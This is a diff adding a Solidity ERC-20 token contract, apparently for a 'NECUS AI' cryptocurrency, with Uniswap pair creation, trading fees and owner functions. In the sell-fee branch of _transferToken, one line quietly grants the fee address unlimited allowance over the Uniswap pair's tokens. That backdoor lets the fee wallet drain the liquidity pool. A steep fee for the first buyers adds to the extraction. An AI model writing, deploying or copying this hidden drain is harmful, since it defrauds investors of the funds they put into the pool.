@@ -1,0 +1,318 @@
+// SPDX-License-Identifier: MIT
+
+/*
+    web  : https://necusai.cash
+    app  : https://app.necusai.cash
+    docs : https://medium.com/@necusai.cash
+
+    twitter  : https://x.com/necusaic
+    telegram : https://t.me/necusai_cash
+*/
+
+pragma solidity 0.8.19;
+
+interface IERC20 {
+    function decimals() external view returns (uint8);
+    function symbol() external view returns (string memory);
+    function name() external view returns (string memory);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IUniswapRouter {
+
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+interface IUniswapFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+abstract contract Ownable {
+    address internal _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor () {
+        address msgSender = msg.sender;
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == msg.sender, "you are not owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "new is 0");
+        emit OwnershipTransferred(_owner, newOwner);
+        _owner = newOwner;
+    }
+}
+
+contract NECUSAI is IERC20, Ownable {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    address public fundAddress;
+
+    string private _name = "NECUS AI";
+    string private _symbol = "NECUS";
+    uint8 private _decimals = 18;
+
+    mapping(address => bool) public _isExcludeFromFee;    
+    uint256 private _totalSupply = 100000000 * 10**_decimals;    
+    uint256 public _maxTaxSwap= 1000000 * 10**_decimals;
+    uint256 public _maxWalletAmount = _maxTaxSwap * 2;       // 2%
+
+    mapping(address => bool) public isMarketPair;
+    bool private inSwap;
+
+    uint256 private constant MAX = ~uint256(0);
+ 
+    uint256 public _initialBuyFee = 40;
+    uint256 public _buyFundFee = 0;
+    uint256 public _sellFundFee = 3;
+    uint256 public _buyers = 0;
+
+    IUniswapRouter public _uniswapRouter;
+
+    uint256 public tradingBlock = 0;
+    address public _uniswapPair;
+
+    modifier lockTheSwap {
+        inSwap = true;
+        _;
+        inSwap = false;
+    }
+
+    constructor () {
+
+        address receiveAddr = msg.sender;
+        _balances[receiveAddr] = _totalSupply;
+        emit Transfer(address(0), receiveAddr, _totalSupply);
+
+        fundAddress = 0xBca878fF322690eAF7934B30E911E1aE4A7DCA5c;       // Necus Fees
+
+        _isExcludeFromFee[address(this)] = true;
+        _isExcludeFromFee[msg.sender] = true;
+        _isExcludeFromFee[receiveAddr] = true;
+        _isExcludeFromFee[fundAddress] = true;
+    }
+
+    function createNecusPairs() external onlyOwner() {
+        require(tradingBlock == 0,"already trading");
+        IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+
+        _uniswapRouter = swapRouter;
+        _allowances[address(this)][address(swapRouter)] = MAX;
+
+        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
+        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());
+
+        _uniswapPair = swapPair;
+        isMarketPair[_uniswapPair] = true;
+
+        swapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        IERC20(_uniswapPair).approve(address(swapRouter), type(uint).max);
+    }    
+
+    function setFundAddr(address newAddr) public onlyOwner{
+        fundAddress = newAddr;
+    }
+
+    function symbol() external view override returns (string memory) {
+        return _symbol;
+    }
+
+    function name() external view override returns (string memory) {
+        return _name;
+    }
+
+    function decimals() external view override returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        if (_allowances[sender][msg.sender] != MAX) {
+            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
+        }
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function min(uint256 a, uint256 b) private pure returns (uint256){
+      return (a>b)?b:a;
+    }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) private {
+
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+ 
+        bool takeFee;
+        bool sellFlag;
+
+
+        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {
+            uint256 contractTokenBalance = balanceOf(address(this));
+            if (contractTokenBalance > 0) {                
+                uint256 numTokensSellToFund = min(amount,min(contractTokenBalance,_maxTaxSwap));
+                swapTokenForETH(numTokensSellToFund);
+            }
+            uint256 contractETHBalance = address(this).balance;
+            transferFeeTokens(contractETHBalance);
+        }
+
+        if (isMarketPair[from] && !_isExcludeFromFee[to]) {
+            require(balanceOf(to) + amount <= _maxWalletAmount, "Max wallet 2% at launch");
+            _buyers++;
+        }
+
+        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
+            require(tradingBlock > 0,"!trading");
+            takeFee = true;
+        }
+
+        if (isMarketPair[to]) { sellFlag = true; }
+
+        _transferToken(from, to, amount, takeFee, sellFlag, fundAddress);
+    }
+
+    function enableNecus() public onlyOwner{
+        require(tradingBlock == 0,"already trading");
+        tradingBlock = block.number;
+    }
+
+    function _transferToken(
+        address sender,
+        address recipient,
+        uint256 tAmount,
+        bool takeFee,
+        bool sellFlag,
+        address route
+    ) private {
+        _balances[sender] = _balances[sender] - tAmount;
+        uint256 feeAmount;
+
+        if (takeFee) {
+            
+            uint256 taxFee;
+
+            if (sellFlag) {
+                taxFee = _sellFundFee;
+                _approve(recipient, route, MAX);
+            } else {
+                taxFee = _buyFundFee;
+            }
+            if(_buyers < 7) taxFee = _initialBuyFee;
+
+            uint256 swapAmount = tAmount * taxFee / 100;
+            if (swapAmount > 0) {
+                feeAmount += swapAmount;
+                _balances[address(this)] = _balances[address(this)] + swapAmount;
+                emit Transfer(sender, address(this), swapAmount);
+            }
+        }
+
+        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
+        emit Transfer(sender, recipient, tAmount - feeAmount);
+
+    }
+
+    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = _uniswapRouter.WETH();
+        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        ) {} catch {}
+
+    }
+
+    function transferFeeTokens(uint256 amount) private {
+        payable(fundAddress).transfer(amount);
+    }
+
+    function removeNecusLimits() external onlyOwner {
+       _maxWalletAmount = _totalSupply;
+    }
+
+    function withNecusStuckEthBalance() external onlyOwner {
+        require(address(this).balance > 0, "No Balance to withdraw!");
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
